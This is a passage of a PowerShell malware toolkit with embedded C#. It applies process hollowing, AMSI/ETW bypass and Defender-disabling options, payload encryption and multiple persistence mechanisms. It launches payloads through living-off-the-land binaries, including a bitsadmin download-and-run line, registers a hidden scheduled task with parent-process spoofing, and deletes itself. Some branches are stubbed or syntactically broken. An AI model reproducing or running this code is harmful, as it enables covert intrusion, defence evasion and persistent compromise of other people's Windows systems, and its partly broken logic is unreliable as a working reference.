            throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
        }

        try {
            // Get the thread context (EIP)
            ctx.ContextFlags = CONTEXT_FULL;
            GetThreadContext(pi.hThread, ref ctx);

            // Read the PEB image base address
            IntPtr pbImageBaseAddress = IntPtr.Zero;
            IntPtr pbi = IntPtr.Zero;
            uint bytesRead = 0;

            // Allocate memory for the payload
            byte[] payload = System.IO.File.ReadAllBytes(payloadPath);
            IntPtr pRemoteMem = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)payload.Length,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            // Write the payload to the allocated memory
            IntPtr bytesWritten;
            WriteProcessMemory(pi.hProcess, pRemoteMem, payload, payload.Length, out bytesWritten);

            // Set the thread context to our payload
            ctx.Eax = (uint)pRemoteMem.ToInt32();
            SetThreadContext(pi.hThread, ref ctx);

            // Resume the thread
            ResumeThread(pi.hThread);
        }
        finally {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
}
"@
            Add-Type -TypeDefinition $hollowingCode -Language CSharp | Out-Null
            [ProcessHollow]::HollowAndRun($HollowProcess, $FilePath)
            Write-Verbose "[+] Process hollowing applied to $HollowProcess"
        } catch {
            Write-Warning "[!] Process hollowing failed: $_"
        }
    }

    # PPID Spoofing would be handled at the task creation level
    # Other injection techniques would be implemented here
}

# Region: Main Execution
try {
    # Apply evasion techniques first
    Invoke-EvasionTechniques -BypassAMSI:$BypassAMSI -BypassETW:$BypassETW `
        -DisableDefender:$DisableDefender -ClearLogs:$ClearLogs `
        -AntiDebug:$AntiDebug -AntiVM:$AntiVM -PatchAMSI:$PatchAMSI `
        -PatchETW:$PatchETW -APIUnhooking:$APIUnhooking `
        -BlockETWProviders:$BlockETWProviders -DisableLogging:$DisableLogging `
        -DisableRealTimeMonitoring:$DisableRealTimeMonitoring `
        -DisableBehaviorMonitoring:$DisableBehaviorMonitoring -DisableIOAV:$DisableIOAV

    # Process the payload
    $processedPath = Invoke-PayloadProcessing -FilePath $FilePath `
        -UseAlternateDataStream:$UseAlternateDataStream -Base64Encode:$Base64Encode `
        -SecureString:$SecureString -UseXOR:$UseXOR -XORKey:$XORKey `
        -UseRC4:$UseRC4 -RC4Key:$RC4Key -UseAES:$UseAES `
        -AESKey:$AESKey -AESIV:$AESIV

    # Setup persistence mechanisms
    Invoke-Persistence -FilePath $processedPath -CustTaskName $CustTaskName `
        -AddToStartup:$AddToStartup -WMIPersistence:$WMIPersistence `
        -RegistryPersistence:$RegistryPersistence -ServicePersistence:$ServicePersistence `
        -ServiceName:$ServiceName -SchTaskPersistence:$SchTaskPersistence `
        -SecondTaskName:$SecondTaskName

    # Prepare process injection
    Invoke-ProcessInjection -FilePath $processedPath `
        -ProcessHollowing:$ProcessHollowing -HollowProcess:$HollowProcess `
        -PPIDSpoofing:$PPIDSpoofing -SpoofedPPID:$SpoofedPPID `
        -ThreadlessInject:$ThreadlessInject -EarlyBird:$EarlyBird `
        -ModuleStomping:$ModuleStomping -ProcessDoppelganging:$ProcessDoppelganging `
        -GhostWriting:$GhostWriting

    # Determine execution method
    $command = "powershell.exe"
    $arguments = "-NoProfile -ExecutionPolicy Bypass"

    if ($Hidden) { $arguments += " -WindowStyle Hidden" }
    if ($UseCmdLauncher) {
        $command = "cmd.exe"
        $arguments = "/c start /min conhost.exe cmd.exe /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$processedPath`""
    }
    elseif ($UseWScript) {
        $command = "wscript.exe"
        $tempScript = "$env:TEMP\$((New-Guid).ToString()).vbs"
        Set-Content -Path $tempScript -Value "CreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -ExecutionPolicy Bypass -File $processedPath`", 0, False"
        $arguments = "//B `"$tempScript`""
    }
    elseif ($UseMshta) {
        $command = "mshta.exe"
        $tempScript = "$env:TEMP\$((New-Guid).ToString()).hta"
        $htaContent = @"
<script language="VBScript">
    Window.Close
    CreateObject("WScript.Shell").Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File $processedPath", 0, False
</script>
"@
        Set-Content -Path $tempScript -Value $htaContent
        $arguments = "`"$tempScript`""
    }
    elseif ($UseInstallUtil) {
        $command = "$env:SystemRoot\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe"
        # Would need to create a custom installer class for this to work properly
        $arguments = "/logfile= /LogToConsole=false /U `"$processedPath`""
    }
    elseif ($UseRegsvr32) {
        $command = "regsvr32.exe"
        $tempDll = "$env:TEMP\$((New-Guid).ToString()).dll"
        # Would need to create a COM scriptlet for this to work properly
        $arguments = "/s /n /u /i:`"$processedPath`" scrobj.dll"
    }
    elseif ($UseRundll32) {
        $command = "rundll32.exe"
        $tempDll = "$env:TEMP\$((New-Guid).ToString()).dll"
        # Would need to create a proper DLL with an export function
        $arguments = "`"$tempDll`",DllRegisterServer"
    }
    elseif ($UseCMSTP) {
        $command = "cmstp.exe"
        $tempInf = "$env:TEMP\$((New-Guid).ToString()).inf"
        $infContent = @"
[Version]
Signature=$CHICAGO$
AdvancedINF=2.5

[DefaultInstall]
RunPreSetupCommands=command

[command]
powershell.exe -NoProfile -ExecutionPolicy Bypass -File $processedPath
"@
        Set-Content -Path $tempInf -Value $infContent
        $arguments = "/s `"$tempInf`""
    }
    elseif ($UseExcelDDE) {
        $command = "excel.exe"
        $tempXls = "$env:TEMP\$((New-Guid).ToString()).xls"
        # DDE execution would require proper DDE command formatting
        $arguments = "`"$tempXls`""
    }
    elseif ($UseBitsTransfer) {
        $command = "$env:SystemRoot\System32\bitsadmin.exe"
        $jobName = (New-Guid).ToString()
        $arguments = "/transfer $jobName /download /priority high http://127.0.0.1/payload.ps1 `$env:TEMP\payload.ps1` & powershell.exe -NoProfile -ExecutionPolicy Bypass -File `$env:TEMP\payload.ps1`"
    }
    elseif ($Base64Encode) {
        $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("& {`"$processedPath`"}"))
        $arguments += " -EncodedCommand $encodedCommand"
    }
    elseif ($CustomCommand -ne "") {
        $command = $CustomCommand.Split(' ')[0]
        $arguments = ($CustomCommand.Split(' ') | Select-Object -Skip 1) -join ' '
    }
    else {
        $arguments += " -File `"$processedPath`""
    }

    if ($UseCOM) {
        $command = "powershell.exe"
        $arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"$([ScriptBlock]::Create((New-Object IO.StreamReader '$processedPath').ReadToEnd()))`""
    }

    # Build the task XML with all options
    $disallowStartIfOnBatteries = if ($RunOnBattery) { "false" } else { "true" }
    $startWhenAvailable = if ($StartWhenAvailable) { "true" } else { "false" }
    $hiddenTask = if ($Hidden) { "true" } else { "false" }
    $wakeToRun = if ($WakeToRun) { "true" } else { "false" }
    $networkRequired = if ($NetworkRequired) { "true" } else { "false" }

    $taskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>$formattedStartTime</Date>
    <Author>$RunAsUser</Author>
    <URI>\$CustTaskName</URI>
    <SecurityDescriptor>D:(A;;FA;;;SY)(A;;FA;;;BA)(A;;FA;;;WD)</SecurityDescriptor>
  </RegistrationInfo>
  <Triggers>
"@

    # Add appropriate trigger based on type
    switch ($TriggerType) {
        "Time" {
            $taskXml += @"
    <TimeTrigger>
      <StartBoundary>$formattedStartTime</StartBoundary>
      <Enabled>true</Enabled>
"@
            if ($RepeatInterval) {
                $taskXml += @"
      <Repetition>
        <Interval>$RepeatInterval</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
"@
            }
            $taskXml += @"    </TimeTrigger>
"@
        }
        "Logon" {
            $taskXml += @"
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
"@
        }
        "Boot" {
            $taskXml += @"
    <BootTrigger>
      <Enabled>true</Enabled>
      <Delay>PT$($JitterMinutes)M</Delay>
    </BootTrigger>
"@
        }
        "Event" {
            $taskXml += @"
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription><QueryList><Query Id="0"><Select Path="$EventLog">*[System[Provider[@Name='$EventSource'] and (EventID=$EventID)]]</Select></Query></QueryList></Subscription>
    </EventTrigger>
"@
        }
        "Idle" {
            $taskXml += @"
    <IdleTrigger>
      <Enabled>true</Enabled>
    </IdleTrigger>
"@
        }
        "SessionStateChange" {
            $taskXml += @"
    <SessionStateChangeTrigger>
      <Enabled>true</Enabled>
      <StateChange>$SessionState</StateChange>
    </SessionStateChangeTrigger>
"@
        }
        default {
            $taskXml += @"
    <TimeTrigger>
      <StartBoundary>$formattedStartTime</StartBoundary>
      <Enabled>true</Enabled>
"@
            if ($RepeatInterval) {
                $taskXml += @"
      <Repetition>
        <Interval>$RepeatInterval</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
"@
            }
            $taskXml += @"    </TimeTrigger>
"@
        }
    }

    $taskXml += @"  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>$RunAsUser</UserId>
      <LogonType>S4U</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>$MultipleInstancePolicy</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>$disallowStartIfOnBatteries</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>$disallowStartIfOnBatteries</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>$startWhenAvailable</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>$networkRequired</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>$hiddenTask</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>$wakeToRun</WakeToRun>
    <ExecutionTimeLimit>$ExecutionTimeLimit</ExecutionTimeLimit>
    <Priority>7</Priority>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <AllowStartOnBatteries>true</AllowStartOnBatteries>
    <DontStopOnIdleEnd>true</DontStopOnIdleEnd>
    <NetworkSettings>
      <Name>Any</Name>
      <Id>{00000000-0000-0000-0000-000000000000}</Id>
      <Source>Any</Source>
    </NetworkSettings>
  </Settings>
  <Actions Context="Author">
"@

    # Build the execution command with all options
    if ($UseCOM) {
        $taskXml += @"
    <ComHandler>
      <ClassId>{00000000-0000-0000-0000-000000000000}</ClassId>
      <Data>$arguments</Data>
    </ComHandler>
"@
    }
    else {
        $taskXml += @"
    <Exec>
      <Command>$command</Command>
      <Arguments>$arguments</Arguments>
      <WorkingDirectory>$([System.IO.Path]::GetDirectoryName($processedPath))</WorkingDirectory>
    </Exec>
"@
    }

    $taskXml += @"  </Actions>
</Task>
"@

    # Register the task
    try {
        if ($PPIDSpoofing) {
            # Create task with spoofed parent process
            $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
            $processStartInfo.FileName = "schtasks.exe"
            $processStartInfo.Arguments = "/create /tn `$CustTaskName` /xml `"$([System.IO.Path]::GetTempFileName())`" /f"
            $processStartInfo.UseShellExecute = $false
            $processStartInfo.CreateNoWindow = $true

            # Write XML to temp file
            $tempXmlFile = [System.IO.Path]::GetTempFileName()
            Set-Content -Path $tempXmlFile -Value $taskXml

            # Replace temp file in arguments
            $processStartInfo.Arguments = $processStartInfo.Arguments -replace [regex]::Escape($tempXmlFile), $tempXmlFile

            # Set parent process if specified
            if ($SpoofedPPID -gt 0) {
                $processStartInfo = @{
                    FileName = "schtasks.exe"
                    Arguments = "/create /tn `$CustTaskName` /xml `$tempXmlFile` /f"
                    WindowStyle = "Hidden"
                    CreateNoWindow = $true
                }

                if ($ParentProcess -ne "") {
                    $parent = Get-Process -Name $ParentProcess -ErrorAction SilentlyContinue
                    if ($parent) {
                        $processStartInfo = @{
                            FileName = "schtasks.exe"
                            Arguments = "/create /tn `$CustTaskName` /xml `$tempXmlFile` /f"
                            WindowStyle = "Hidden"
                            CreateNoWindow = $true
                        }
                    }
                }

            # For actual PPID spoofing, we'd need to use CreateProcess with PROCESS_CREATION_FLAGS
            # This is a simplified approach
            Start-Process @processStartInfo -Wait

            # Clean up temp file
            Remove-Item -Path $tempXmlFile -Force -ErrorAction SilentlyContinue
        }
        else {
            # Normal task registration
            $tempXmlFile = [System.IO.Path]::GetTempFileName()
            Set-Content -Path $tempXmlFile -Value $taskXml
            Register-ScheduledTask -Xml (Get-Content -Path $tempXmlFile -Raw) -TaskName $CustTaskName -Force | Out-Null
            Remove-Item -Path $tempXmlFile -Force -ErrorAction SilentlyContinue
        }

        Write-Output "[+] Scheduled task '$CustTaskName' registered successfully."
    } catch {
        Write-Error "[-] Failed to register scheduled task: $_"
        exit 1
    }

    # Start the task if not a delayed trigger
    if ($TriggerType -ne "Time" -or $Time -le (Get-Date).AddMinutes(1)) {
        try {
            Start-ScheduledTask -TaskName $CustTaskName
            Write-Output "[+] Scheduled task '$CustTaskName' started successfully."
        } catch {
            Write-Error "[-] Failed to start scheduled task: $_"
        }
    } else {
        Write-Output "[*] Task scheduled to run at $Time"
    }

    # Verify process
    Start-Sleep -Seconds 5
    try {
        $processCheck = if ($UseCmdLauncher) { "cmd.exe" } else { "powershell.exe" }
        $processCheck += " -NoProfile -ExecutionPolicy Bypass"

        $processId = Get-WmiObject Win32_Process | Where-Object {
            $_.CommandLine -like "*$processCheck*" -and
            $_.CommandLine -like "*$([System.IO.Path]::GetFileName($processedPath))*"
        } | Select-Object -ExpandProperty ProcessId -First 1

        if ($processId) {
            Write-Output "[+] Process detected with ID: $processId"

            if ($PPIDSpoofing -and $SpoofedPPID -gt 0) {
                try {
                    $process = Get-Process -Id $processId -ErrorAction SilentlyContinue
                    if ($process -and $process.Parent.Id -ne $SpoofedPPID) {
                        Write-Warning "[!] PPID spoofing may have failed. Expected $SpoofedPPID, got $($process.Parent.Id)"
                    }
                } catch {
                    Write-Warning "[!] Could not verify PPID spoofing: $_"
                }
            }
        } else {
            Write-Output "[*] Process not immediately detected (may be delayed or hidden)"
        }
    } catch {
        Write-Error "[-] Failed to verify process: $_"
    }

    # Self-delete if requested
    if ($SelfDelete) {
        try {
            $selfPath = $MyInvocation.MyCommand.Definition
            if (Test-Path $selfPath) {
                Start-Sleep -Seconds 10
                Remove-Item -Path $selfPath -Force -ErrorAction SilentlyContinue
                Write-Verbose "[+] Self-deletion initiated"
            }
        } catch {
            Write-Warning "[!] Self-deletion failed: $_"
        }
    }

} catch {
    Write-Error "[-] Fatal error: $_"
    exit 1
}
